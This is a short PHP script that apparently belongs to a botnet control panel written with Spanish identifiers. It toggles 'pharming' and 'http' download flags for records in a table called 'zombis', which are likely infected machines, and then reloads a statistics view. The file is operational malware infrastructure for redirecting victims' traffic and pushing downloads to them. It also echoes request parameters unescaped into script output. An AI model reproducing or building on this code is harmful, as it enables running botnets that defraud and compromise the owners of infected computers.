<?php @session_start(); if ( !isset($_SESSION['login']) ){ exit() ; }	?>
<?php
require_once('../includes.php');

if( $_GET['f'] == 'actpha' ){
	$Datos = array ('pharming' => 1 );
	$UpdateBuscar = array('id' => $_GET['id']) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo "
	<script type='text/javascript'>
		ajax_load('Vistas/Estadisticas.php?pag=".$_GET['pag']."&pais=".$_GET['pais']."', 'table_estadisticas');
	</script>
	" ;
}


if( $_GET['f'] == 'despha' ){
	$Datos = array ('pharming' => 0 );
	$UpdateBuscar = array('id' => $_GET['id']) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo "
	<script type='text/javascript'>
		ajax_load('Vistas/Estadisticas.php?pag=".$_GET['pag']."&pais=".$_GET['pais']."', 'table_estadisticas');
	</script>
	" ;
}



if( $_GET['f'] == 'actdwn' ){
	$Datos = array ('http' => 1 );
	$UpdateBuscar = array('id' => $_GET['id']) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo "
	<script type='text/javascript'>
		ajax_load('Vistas/Estadisticas.php?pag=".$_GET['pag']."&pais=".$_GET['pais']."', 'table_estadisticas');
	</script>
	" ;
}


if( $_GET['f'] == 'desdwn' ){
	$Datos = array ('http' => 0 );
	$UpdateBuscar = array('id' => $_GET['id']) ;
	$Result = $DB->Update('zombis' , false , $Datos , $UpdateBuscar) ;
	echo "
	<script type='text/javascript'>
		ajax_load('Vistas/Estadisticas.php?pag=".$_GET['pag']."&pais=".$_GET['pais']."', 'table_estadisticas');
	</script>
	" ;
}


?>


